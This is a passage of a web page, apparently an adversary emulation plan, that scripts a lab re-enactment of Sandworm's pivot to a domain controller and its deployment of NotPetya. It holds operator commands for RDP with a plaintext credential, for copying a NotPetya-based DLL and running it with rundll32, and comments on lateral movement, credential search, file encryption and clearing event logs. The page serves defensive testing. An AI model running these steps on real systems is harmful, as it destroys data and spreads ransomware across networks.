+<li><p><a href="https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="test-9-steps-18-19">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-9-steps-18-19">#</doc-anchor-trigger>
+        <span>Test 9 (Steps 18-19)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-18---pivot-to-dc">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-18---pivot-to-dc">#</doc-anchor-trigger>
+        <span>Step 18 - Pivot to DC</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>Sandworm logs into arrakis/10.0.1.4 over RDP using domain credentials (patreides).</p>
+<p>Sandworm uploads a DLL based on NotPetya to arrakis (C:\Windows\perfc.dat) over a network share tunneled through the RDP connection.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">File write: C:\Windows\perfc.dat</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> go back to your first terminal window; rename to RDP into arrakis.</p>
+<p>RDP into arrakis/domain controller using domain admin credentials.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has used stolen credentials to access administrative accounts within the domain.
+
+xfreerdp +clipboard /u:WORKGROUP\\patreides /p:&quot;ebqMB7DmM81QVUqpf7XI&quot; /v:10.0.1.4 /drive:X,sandworm/Resources/NotPetya/bin</code></pre>
+</doc-codeblock></div>
+<p>Accept certificate warnings if prompted.</p>
+<p>Once logged in, close server manager and any spurious warnings or pop-ups.</p>
+<p>Open PowerShell as administrator <code v-pre>(right click &gt; run as administrator &gt; yes)</code>:</p>
+<p>Copy NotPetya from dungeon to arrakis over RDP channel:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">copy \\TSCLIENT\X\SharpNP.dll C:\Windows\perfc.dat</code></pre>
+</doc-codeblock></div>
+<p>Delete the RDP network share:</p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://www.justice.gov/opa/press-release/file/1328521/download" class="outbound" target="_blank"><span>https://www.justice.gov/opa/press-release/file/1328521/download</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="step-19---deploy-notpetya">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-19---deploy-notpetya">#</doc-anchor-trigger>
+        <span>Step 19 - Deploy NotPetya</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>Sandworm executes NotPetya (perfc.dat) on arrakis / 10.0.1.4.</p>
+<p>NotPetya creates a scheduled task called &quot;Restart&quot; that reboots the workstation and is executed at the end of the program.</p>
+<p>NotPetya encrypts files under C:\Users (recursive) via AES-128.</p>
+<p>NotPetya drops a ransom note in C:\README.txt.</p>
+<p>NotPetya copies and executes itself on 10.0.1.8.</p>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># NotPetya is executed using rundll32. #1 - is the first function exported in the DLL
+
+# NotPetya creates a task to reboot the system one hour after infection.
+
+# NotPetya searches for hosts for lateral movement
+
+# NotPetya searches for credentials
+
+# NotPetya copies and executes itself (via wmic) on discovered hosts
+
+# NotPetya searches for files with specific file extensions for encryption.
+
+# NotPetya uses wevtutil to clear the Windows event logs.
+
+# NotPetya executes the scheduled task to reboot the host.</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">rundll32.exe C:\Windows\perfc.dat,&quot;#1&quot;</code></pre>
+</doc-codeblock></div>
+<p>Scenario complete.</p>
+<p>Note: if you need to confirm encryption worked, do the following:</p>
+<p>Open CMD, and cat this file:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf</code></pre>
+</doc-codeblock></div>
+<p>If the file looks like encrypted binary, notPetya worked.</p>
+<p>You may also run this command on Quadra to confirm lateral movement worked:</p>
+<p>From DC PowerShell:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Enter-PsSession -ComputerName quadra</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html" class="outbound" target="_blank"><span>https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.us-cert.gov/ncas/alerts/TA17-181A" class="outbound" target="_blank"><span>https://www.us-cert.gov/ncas/alerts/TA17-181A</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.justice.gov/opa/press-release/file/1328521/download" class="outbound" target="_blank"><span>https://www.justice.gov/opa/press-release/file/1328521/download</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+</ul>
+<br>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/sandworm/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Sandworm</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/sandworm/emulation_plan/scenario_2/infrastructure/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Scenario 1 Infrastructure</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Scenario Overview", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
